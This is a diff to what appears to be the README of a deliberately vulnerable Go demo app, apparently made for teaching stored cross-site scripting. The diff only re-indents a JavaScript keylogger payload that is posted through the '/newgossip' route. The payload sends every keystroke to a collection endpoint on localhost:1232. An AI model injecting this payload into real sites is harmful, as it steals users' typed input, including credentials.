@@ -66,15 +66,15 @@ go run main.go
 Then, the attacker can insert a new post through **/newgossip** route using the following code in text field:
 
 ```html
-   <script>
-   var k="";
-   document.onkeypress=function(e) {
-      e = e || window.event;
-      k+=e.key;
-      var i=new Image;
-      i.src="http://localhost:1232/"+k;
-   }
-   </script>
+<script>
+var k="";
+document.onkeypress=function(e) {
+   e = e || window.event;
+   k+=e.key;
+   var i=new Image;
+   i.src="http://localhost:1232/"+k;
+}
+</script>
 ```
 
 This code implements a keylogger by capturing all keyboard inputs from users and send them to the API created before.
